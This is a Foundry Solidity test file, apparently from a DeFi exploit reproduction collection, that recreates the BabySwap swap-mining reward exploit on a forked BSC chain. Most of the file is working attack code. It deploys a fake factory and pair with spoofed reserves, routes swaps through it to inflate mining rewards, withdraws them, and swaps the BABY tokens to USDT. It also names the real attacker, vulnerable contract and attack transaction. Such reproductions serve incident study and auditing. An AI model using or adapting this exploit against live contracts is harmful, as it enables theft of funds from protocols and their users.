// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Attacker : 0x0000000038b8889b6ab9790e20FC16fdC5714922
// Attack Contract : https://bscscan.com/address/0xde7e741bd9dc7209b56f1ef3b663efb288c928d4
// Vulnerable Contract : https://bscscan.com/address/0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636
// Attack Tx : https://bscscan.com/tx/0xcca7ea9d48e00e7e32e5d005b57ec3cac28bc3ad0181e4ca208832e62aa52efe

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636#code

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1576441612812836865

interface IBabySwapRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address[] memory factories,
        uint256[] memory fees,
        address to,
        uint256 deadline
    ) external;
}

interface ISwapMining {
    function takerWithdraw() external;
}

contract FakeFactory {
    address Owner;
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);

    constructor() {
        Owner = msg.sender;
    }

    // fake pair
    function getPair(address, /*token1*/ address /*token2*/ ) external view returns (address pair) {
        pair = address(this);
    }

    // fake pair
    function getReserves() external pure returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {
        reserve0 = 10_000_000_000 * 1e18;
        reserve1 = 1;
        blockTimestampLast = 0;
    }

    function swap(uint256, /*amount0Out*/ uint256, /*amount1Out*/ address, /*to*/ bytes calldata /*data*/ ) external {
        if (WBNB_TOKEN.balanceOf(address(this)) > 0) WBNB_TOKEN.transfer(Owner, WBNB_TOKEN.balanceOf(address(this)));
        // if(USDT_TOKEN.balanceOf(address(this)) > 0) USDT_TOKEN.transfer(Owner, USDT_TOKEN.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BABY_TOKEN = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    IBabySwapRouter constant BABYSWAP_ROUTER = IBabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
    ISwapMining constant SWAP_MINING = ISwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);
    address constant BABYSWAP_FACTORY = 0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da;

    function setUp() public {
        vm.createSelectFork("bsc", 21_811_979);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(BABY_TOKEN), "BABY_TOKEN");
        vm.label(address(BABYSWAP_ROUTER), "BABYSWAP_ROUTER");
        vm.label(address(SWAP_MINING), "SWAP_MINING");
        vm.label(BABYSWAP_FACTORY, "BABYSWAP_FACTORY");
        vm.label(0xE730C7B7470447AD4886c763247012DfD233bAfF, "USDT_BABY_BABYPAIR");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
        (bool success,) = address(WBNB_TOKEN).call{value: 20_000}("");
        require(success, "Transfer failed.");
        WBNB_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);
        BABY_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);

        // create fakefactory
        FakeFactory factory = new FakeFactory();

        // swap token to claim reward
        address[] memory path1 = new address[](2);
        path1[0] = address(WBNB_TOKEN);
        path1[1] = address(USDT_TOKEN);
        address[] memory factories = new address[](1);
        factories[0] = address(factory);
        uint256[] memory fees = new uint256[](1);
        fees[0] = 0;
        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path1, factories, fees, address(this), block.timestamp);
        // swap token to claim reward
        address[] memory path2 = new address[](2);
        path2[0] = address(WBNB_TOKEN);
        path2[1] = address(BABY_TOKEN);
        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path2, factories, fees, address(this), block.timestamp);

        // claim reward token
        SWAP_MINING.takerWithdraw();
        _BABYToUSDT();

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
    }

    /**
     * Auxiliary function to swap all BABY to USDT
     */
    function _BABYToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(BABY_TOKEN);
        path[1] = address(USDT_TOKEN);
        address[] memory factories = new address[](1);
        factories[0] = BABYSWAP_FACTORY;
        uint256[] memory fees = new uint256[](1);
        fees[0] = 3000;
        BABYSWAP_ROUTER.swapExactTokensForTokens(
            BABY_TOKEN.balanceOf(address(this)), 0, path, factories, fees, address(this), block.timestamp
        );
    }
}
